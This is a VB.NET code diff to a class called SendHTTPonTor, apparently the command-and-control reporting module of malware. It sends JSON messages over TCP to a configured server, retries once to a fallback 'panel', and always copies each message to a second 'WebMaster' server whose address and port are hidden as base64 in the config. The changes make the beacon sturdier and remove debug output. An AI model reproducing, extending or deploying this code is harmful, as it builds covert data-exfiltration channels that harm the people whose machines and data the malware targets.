@@ -10,6 +10,7 @@ Public Class SendHTTPonTor
     Public write As StreamWriter
     Public TCP As New TcpClient
     Private WebMaster As Boolean = False
+    Private FallbackPanel As Boolean = True
     Public Sub TalkChannelHTTP(ByVal msg As Object, ByVal att As String, ByVal address As String, ByVal ServerReachPort As Integer)
         Dim JsonString As String = JsonConvert.SerializeObject(msg).Replace("\n", "").Replace("\r", "")
         Dim Body = Encoding.UTF8.GetBytes(JsonString)
@@ -42,30 +43,35 @@ Public Class SendHTTPonTor
                 stream.Write(Body, 0, bodyLength)
                 stream.Flush()
             End Using
-            If Config.Variables.Debug Then
-                Dim reader = New StreamReader(TCP.GetStream()) 'Debug
-                Console.WriteLine("Send!...")
-                Console.WriteLine(header)
-                While reader.Peek > -1
-                    Console.Write(Convert.ToChar(reader.Read()).ToString)
-                End While
-            End If
             TCP.Client.Close()
         Catch ex As Exception
-            TalkChannelHTTP(msg, att, Config.Variables.FallbackAdress, Config.Variables.FallbackServerReachPort)
-            If Config.Variables.Debug Then
-                Console.WriteLine("Connection error: " & ex.ToString)
+            If Not WebMaster And FallbackPanel Then
+                FallbackPanel = False
+                Try
+                    If Config.Variables.FallbackAdress IsNot String.Empty And Config.Variables.FallbackServerReachPort <> 0 Then
+                        TalkChannelHTTP(msg, att, Config.Variables.FallbackAdress, Config.Variables.FallbackServerReachPort)
+                    End If
+                    If Config.Variables.Debug Then
+                        Console.WriteLine("Connection error: " & ex.ToString)
+                    End If
+                Catch e As Exception
+                    If Config.Variables.Debug Then
+                        Console.WriteLine("Fallback Connection error: " & e.ToString)
+                    End If
+                End Try
             End If
         End Try
         If Not WebMaster Then
+            WebMaster = True
+            If Config.Variables.Debug Then
+                Console.WriteLine("Webmaster Connection...")
+            End If
             WebMasterServer(msg, att)
         End If
     End Sub
     Private Sub WebMasterServer(ByVal msg As Object, ByVal att As String)
-        WebMaster = True
         Dim address As String = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(Config.Variables.WebMasterAddress))
         Dim port As String = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(Config.Variables.WebMasterPort))
         TalkChannelHTTP(msg, att, address, port)
-        WebMaster = False
     End Sub
 End Class
